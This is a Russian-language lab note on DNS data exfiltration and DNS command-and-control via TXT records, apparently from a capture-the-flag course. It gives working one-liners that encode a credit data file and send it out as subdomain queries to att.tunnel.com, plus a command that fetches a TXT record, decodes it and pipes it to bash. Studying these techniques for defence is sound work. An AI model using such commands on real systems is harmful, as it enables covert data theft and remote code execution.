# DNS DATA EXFILTRATION

## Что такое DNS Data Exfiltration

DNS изначально не предназначен для передачи данных, но злоумышленники используют его для скрытого вывода информации. DNS-запросы редко блокируются, и их сложно отличить от легитимного трафика.

**Почему это работает:**
- DNS-трафик почти всегда разрешён в корпоративных сетях (иначе интернет не работает).
- DNS-запросы редко проверяются на наличие скрытых данных.
- Трафик выглядит как обычные запросы к доменам.


## Как DNS работает в норме

Когда ты вводишь `google.com` в браузере, компьютер отправляет DNS-запрос:
- «Какой IP у google.com?»
- DNS-сервер отвечает: «172.217.16.46»

Всё просто: вопрос → ответ.

## Как злоумышленник это использует

Атакующий регистрирует домен `att.tunnel.com` и настраивает свой DNS-сервер. Жертва отправляет запросы типа:

`TmFtZTogVEhNLXVzZXI.att.tunnel.com`

Вместо обычного поддомена (например, `www`) — там закодированные данные. Атакующий видит этот запрос и декодирует данные.


## Как это работает (общая схема)

1. Атакующий регистрирует домен (например, `tunnel.com`).
2. Настраивает NS-запись, указывающую на его сервер.
3. Жертва отправляет DNS-запросы с данными в поддомене: `data.att.tunnel.com`.
4. Атакующий перехватывает запросы и извлекает данные.


## Ограничения DNS

| Ограничение | Значение |
|-------------|----------|
| Максимальная длина FQDN | 255 символов |
| Максимальная длина одного поддомена (label) | 63 символа |
| Допустимые символы | буквы, цифры, дефис (`-`) |

**Важно:** Если данные больше 255 символов, их нужно разбивать на несколько DNS-запросов.


## Подготовка: NS и A записи

Чтобы принимать DNS-запросы, нужно настроить:

1. **A-запись** — указывает на IP атакующей машины.
2. **NS-запись** — указывает, какой сервер отвечает за поддомен.

Пример:
- `attNS.tunnel.com` → A → `172.20.0.200`
- `att.tunnel.com` → NS → `attNS.tunnel.com`


## 1. РУЧНАЯ DNS EXFILTRATION

### Шаг 1: Подготовка данных

```bash
cat task9/credit.txt | base64
```

### Шаг 2: Разбить на части (по 18 символов)

```bash
cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
```

### Шаг 3: Отправить через `dig`

```bash
cat task9/credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

### Шаг 4: Перехват на атакующей машине

```bash
sudo tcpdump -i eth0 udp port 53 -v
```

### Шаг 5: Восстановление данных

```bash
echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz..." | cut -d"." -f1-8 | tr -d "." | base64 -d
```


## 2. DNS C2 (Command and Control)

**C2** — это когда злоумышленник управляет заражённой машиной удалённо.

**DNS C2** — это управление через DNS-запросы. Вместо прямого соединения, команды передаются через DNS, а результаты возвращаются через DNS-ответы или TXT-записи.

### Как работает DNS C2

| Этап | Действие |
|------|----------|
| 1 | Злоумышленник размещает команду в TXT-записи своего домена. |
| 2 | Заражённая машина периодически запрашивает эту TXT-запись через `dig`. |
| 3 | Получает команду, выполняет её. |
| 4 | Результат отправляется обратно через DNS-запросы (или другой канал). |

### Почему это опасно

- Нет прямого соединения с атакующим (сложнее обнаружить).
- DNS-трафик редко блокируется.
- Команды могут быть закодированы и скрыты в TXT-записях.


## 3. DNS C2 ЧЕРЕЗ TXT ЗАПИСИ

**TXT-записи** — это текстовые поля в DNS, которые обычно используются для проверки владения доменом или SPF-записей. Злоумышленник может хранить там закодированные команды.

**Пример:**

1. Злоумышленник добавляет TXT-запись:
   ```
   script.tunnel.com → "IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo="
   ```
   (Это Base64 от `#!/bin/bash\nping -c 1 test.thm.com`)

2. Жертва запрашивает:
   ```bash
   dig +short -t TXT script.tunnel.com
   ```

3. Получает закодированную команду, декодирует и выполняет:
   ```bash
   dig +short -t TXT script.tunnel.com | tr -d '"' | base64 -d | bash
   ```


## Разница между Exfiltration и C2

| Exfiltration | C2 (Command and Control) |
|--------------|---------------------------|
| Данные уходят от жертвы к атакующему | Команды приходят от атакующего к жертве |
| Жертва отправляет DNS-запросы с данными | Жертва запрашивает TXT-записи с командами |
| Данные в поддомене | Команды в TXT-записи |
| Однонаправленный трафик (данные наружу) | Двунаправленный трафик (команды + результаты) |


## Почему DNS C2 трудно обнаружить

- Использует легитимный протокол.
- Трафик выглядит как обычные DNS-запросы.
- Нет подозрительных TCP-соединений.
- Можно маскироваться под нормальную активность (периодические обновления).


## Инструменты

| Инструмент | Назначение |
|------------|------------|
| `dig` | Отправка DNS-запросов |
| `tcpdump` | Перехват DNS-трафика |
| `base64` | Кодирование данных |
| `fold` | Разбиение строки на части |
| `tr` | Удаление символов |
